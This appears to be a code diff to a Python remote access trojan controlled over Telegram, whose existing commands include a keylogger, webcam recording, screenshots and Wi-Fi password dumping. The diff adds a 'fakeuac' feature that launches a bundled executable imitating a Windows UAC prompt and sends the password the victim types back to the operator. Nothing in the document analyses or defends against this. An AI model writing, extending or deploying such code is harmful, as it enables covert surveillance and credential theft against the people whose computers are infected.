@@ -174,6 +174,8 @@ emoji_dict = {
 try:
     vfx = resource_path(join("assets", "vfx"))
     sfx = resource_path(join("assets", "sfx"))
+    executables = resource_path(join("assets", "executables"))
+    fake_uac_prompt_path = join(executables, "fakeuac.exe")
     prototxt_filename = resource_path(join("assets","model","1.prototxt"))
     caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
 except Exception as e:
@@ -247,6 +249,7 @@ clear - Removes all cv2 windows, closes webcam and removes temporary files.
 selfdestruction - Removes the program from the machine permanently.
 
 🌐 Network & Remote Access
+fakeuac - Displays a fake uac prompt and sends you the password.
 wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
 getip - Get public IP and geolocation.
 
@@ -861,6 +864,7 @@ class PeppinoTelegram:
             "keylogger":self.keylogger,
             "screenshot":self.screenshot,
             "urltoast":notify_toast,
+            "fakeuac":self.fakeuac,
             "messagebox":self.message_box,
             "waitforface":self.waitforface,
             "webcamclip":self.record_webcam,
@@ -1079,6 +1083,11 @@ class PeppinoTelegram:
         system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
         sleep(5)
         system("shutdown -a")
+
+    def fakeuac(self) -> None:
+        proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
+        output = proc.stdout
+        self.bsend(f"Captured password: {str(output)}")
 
     def gabinetti(self) -> None:
         self.jumpscare("plankton_meme", "gabinetti")
@@ -1319,6 +1328,7 @@ class PeppinoTelegram:
             "⌨️ Altf4": "/altf4",
             "🧹 Clear": "/clear",
             "💣 Selfdestruction": "/selfdestruction",
+            "Fake UAC":"/fakeuac",
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
